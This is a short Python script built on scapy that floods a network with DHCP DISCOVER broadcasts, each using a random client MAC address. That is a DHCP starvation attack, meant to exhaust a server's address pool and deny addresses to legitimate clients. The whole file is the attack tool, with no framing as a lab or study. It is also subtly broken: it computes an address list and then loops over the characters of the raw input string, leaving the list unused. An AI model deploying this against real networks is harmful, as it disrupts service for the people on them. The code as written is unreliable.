#import scapy.all as scapy 
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf
from time import sleep
import ipaddress
import sys

conf.checkIPaddr = False

net_range = input(">> Enter Ipv4 range in x.x.x.x/x format: ")
ip_range = [str(ip) for ip in ipaddress.IPv4Network(str(net_range))]

for ip_addr in net_range:
    hw = RandMAC()
    
    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=hw)/DHCP(options=[("message-type", "discover"), "end"])

    sendp(dhcp_discover, iface="WAN")